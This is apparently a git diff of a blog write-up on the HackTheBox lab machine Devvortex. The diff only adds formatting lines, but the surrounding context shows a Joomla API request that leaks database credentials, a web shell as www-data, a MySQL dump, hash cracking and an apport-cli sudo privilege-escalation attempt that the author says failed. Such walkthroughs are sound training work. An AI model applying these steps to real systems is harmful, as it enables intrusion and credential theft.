@@ -31,6 +31,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno}
 {: file='Nmap_Result.txt'}
 
 ## Web Enumeration ⤵️
@@ -81,6 +82,7 @@ I ran manually and I got the credentials through it →
 {"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
 :{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"<PASSWORD>","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
 ```
+{: .nolineno}
 
 As I got the password I logged into the Joomla portal as user `lewis` →
 
@@ -115,6 +117,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@devvortex:/$
 ```
+{: .nolineno}
 
 Through mysql database I got this data →
 
@@ -163,6 +166,7 @@ No query specified
 
 mysql>
 ```
+{: .nolineno}
 
 Now Lets crack the hash for logan and lets see if I can get the password or not I used `John The Ripper` Tool for it →
 
@@ -202,6 +206,7 @@ logan@devvortex:~$ cat user.txt
 eb033792e4f190d86fa5dec30f37e31b
 logan@devvortex:~$
 ```
+{: .nolineno}
 
 Now lets root this machine →
 
@@ -251,6 +256,7 @@ Options:
   -v, --version         Print the Apport version number.
 logan@devvortex:~$
 ```
+{: .nolineno}
 
 This `apport-cli` is a Tool used to →
 
@@ -267,6 +273,7 @@ logan@devvortex:~$ /usr/bin/apport-cli --version
 2.20.11
 logan@devvortex:~$
 ```
+{: .nolineno}
 
 I check online and after enumeration this version is vulnerable to **[Improper Privilege Management](https://security.snyk.io/vuln/SNYK-UBUNTU2004-APPORT-5422150) ⤵️** 
 
@@ -278,5 +285,6 @@ So here I used the crash command flag (-c) and the crash file location within wh
 ```bash
 sudo /usr/bin/apport-cli -c /var/crash/<random_text>.crash
 ```
+{: .nolineno}
 
 After entering this command I would get root access but the crash file is deleted from the machine and I can’t execute this command so can’t able to get root access .
